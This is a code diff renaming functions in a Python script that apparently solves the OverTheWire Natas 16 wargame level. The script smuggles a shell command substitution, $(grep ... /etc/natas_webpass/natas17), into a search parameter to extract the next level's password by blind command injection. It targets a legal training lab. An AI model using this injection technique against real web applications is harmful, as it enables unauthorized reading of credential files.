@@ -2,7 +2,7 @@ import requests
 import string
 import re
 
-def naive_approach(url:str, characters):
+def find_password(url:str, characters):
     password = ''
     for i in range(38):
         for char in characters:
@@ -26,7 +26,7 @@ def naive_approach(url:str, characters):
     return password
         
 
-def optimized_algo(url:str, chars):
+def find_chars(url:str, chars):
     pass_chars = []
     for char in characters:
         string =  {'needle' : f'$(grep -E .*{char} /etc/natas_webpass/natas17)'}
@@ -40,7 +40,7 @@ def optimized_algo(url:str, chars):
             pass_chars.append(char)
             print(pass_chars)
 
-    password = naive_approach(url, pass_chars)    
+    password = find_password(url, pass_chars)    
     print(password)
     return password
 
@@ -50,4 +50,4 @@ print(characters)
 
 url = 'http://natas16.natas.labs.overthewire.org/index.php'
 
-print(optimized_algo(url, characters))
+print(find_chars(url, characters))
